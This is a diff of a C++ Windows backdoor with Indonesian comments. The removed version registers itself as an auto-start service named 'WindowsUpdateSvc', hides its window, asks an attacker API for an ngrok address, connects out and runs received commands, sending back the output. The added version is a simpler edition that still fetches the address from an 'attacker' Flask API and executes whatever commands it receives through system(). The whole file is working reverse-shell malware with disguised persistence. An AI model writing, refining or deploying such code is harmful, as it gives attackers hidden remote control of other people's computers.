@@ -1,143 +1,94 @@
 #include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
+#include <wininet.h>
 #include <iostream>
 #include <string>
-#include <fstream>
-#include <sstream>
-#include <wininet.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
 
-#define ATTACKER_API "http://127.0.0.1:5000"  // API untuk mendapatkan alamat Ngrok
-#define SERVICE_NAME "WindowsUpdateSvc"
-#define RETRY_DELAY 10000  // 10 detik retry jika gagal koneksi
+#define ATTACKER_API "http://192.168.1.3:5000"  // IP API Flask attacker
 
-SERVICE_STATUS ServiceStatus;
-SERVICE_STATUS_HANDLE hStatus;
-
-void HideConsole() {
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
+// Fungsi konversi `char*` ke `wchar_t*`
+std::wstring convertToWideString(const std::string& str) {
+    int size_needed = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
+    std::wstring wstr(size_needed, 0);
+    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], size_needed);
+    return wstr;
 }
 
-std::string getNgrokAddress() {
+// Fungsi untuk mengambil alamat Ngrok dari API
+std::string get_ngrok_address() {
     HINTERNET hInternet, hConnect;
-    DWORD bytesRead;
     char buffer[1024];
-    std::string response;
+    DWORD bytesRead;
+    std::string result;
 
-    hInternet = InternetOpen("NgrokChecker", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    hInternet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return "";
 
-    hConnect = InternetOpenUrl(hInternet, ATTACKER_API, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    std::wstring url = convertToWideString(ATTACKER_API);  // Konversi URL ke `LPCWSTR`
+    hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hConnect) {
         InternetCloseHandle(hInternet);
         return "";
     }
 
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
-        buffer[bytesRead] = '\0';
-        response += buffer;
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead) {
+        buffer[bytesRead] = 0;
+        result += buffer;
     }
 
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
-
-    size_t start = response.find("\"ngrok_address\":\"") + 17;
-    size_t end = response.find("\"", start);
-    
-    if (start != std::string::npos && end != std::string::npos)
-        return response.substr(start, end - start);
-
-    return "";
+    return result;
 }
 
-void ConnectToServer() {
-    WSADATA wsaData;
+// Fungsi untuk menjalankan backdoor
+void run_backdoor() {
+    WSADATA wsa;
     SOCKET sock;
     struct sockaddr_in server;
-    char buffer[1024];
+    WSAStartup(MAKEWORD(2, 2), &wsa);
 
-    WSAStartup(MAKEWORD(2,2), &wsaData);
-    
     while (true) {
-        std::string ngrokAddr = getNgrokAddress();
-        if (ngrokAddr.empty()) {
-            Sleep(RETRY_DELAY);
+        std::string ngrok_addr = get_ngrok_address();
+        if (ngrok_addr.empty()) {
+            Sleep(5000);
             continue;
         }
 
-        std::string serverIP = ngrokAddr.substr(0, ngrokAddr.find(":"));
-        int serverPort = std::stoi(ngrokAddr.substr(ngrokAddr.find(":") + 1));
+        size_t colon_pos = ngrok_addr.find(":");
+        if (colon_pos == std::string::npos) {
+            Sleep(5000);
+            continue;
+        }
+
+        std::string ip = ngrok_addr.substr(0, colon_pos);
+        int port = std::stoi(ngrok_addr.substr(colon_pos + 1));
 
         sock = socket(AF_INET, SOCK_STREAM, 0);
+        server.sin_addr.s_addr = inet_addr(ip.c_str());
         server.sin_family = AF_INET;
-        server.sin_port = htons(serverPort);
-        inet_pton(AF_INET, serverIP.c_str(), &server.sin_addr);
+        server.sin_port = htons(port);
 
         if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
+            char buffer[1024];
             while (true) {
-                memset(buffer, 0, sizeof(buffer));
-                int recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
-                if (recvSize <= 0) break;
-                buffer[recvSize] = '\0';
-
-                FILE* fp = _popen(buffer, "r");
-                char output[1024] = {0};
-                fread(output, 1, sizeof(output) - 1, fp);
-                _pclose(fp);
-
-                send(sock, output, strlen(output), 0);
+                int recv_size = recv(sock, buffer, sizeof(buffer), 0);
+                if (recv_size <= 0) break;
+                buffer[recv_size] = '\0';
+                system(buffer);
             }
         }
+
         closesocket(sock);
-        Sleep(RETRY_DELAY);
+        WSACleanup();
+        Sleep(10000);
     }
-
-    WSACleanup();
 }
 
-void ServiceMain(int argc, char* argv[]) {
-    ServiceStatus.dwServiceType = SERVICE_WIN32;
-    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, [](DWORD control) {
-        if (control == SERVICE_CONTROL_STOP) {
-            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-            SetServiceStatus(hStatus, &ServiceStatus);
-            exit(0);
-        }
-    });
-
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(hStatus, &ServiceStatus);
-
-    HideConsole();
-    ConnectToServer();
-}
-
-void InstallService() {
-    char path[MAX_PATH];
-    GetModuleFileName(NULL, path, MAX_PATH);
-
-    std::string command = "sc create " + std::string(SERVICE_NAME) + 
-        " binPath= \"" + path + "\" start= auto";
-
-    system(command.c_str());
-}
-
-int main(int argc, char* argv[]) {
-    if (argc > 1 && std::string(argv[1]) == "install") {
-        InstallService();
-        return 0;
-    }
-
-    SERVICE_TABLE_ENTRY ServiceTable[] = {
-        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
-        { NULL, NULL }
-    };
-
-    StartServiceCtrlDispatcher(ServiceTable);
+int main() {
+    run_backdoor();
     return 0;
 }
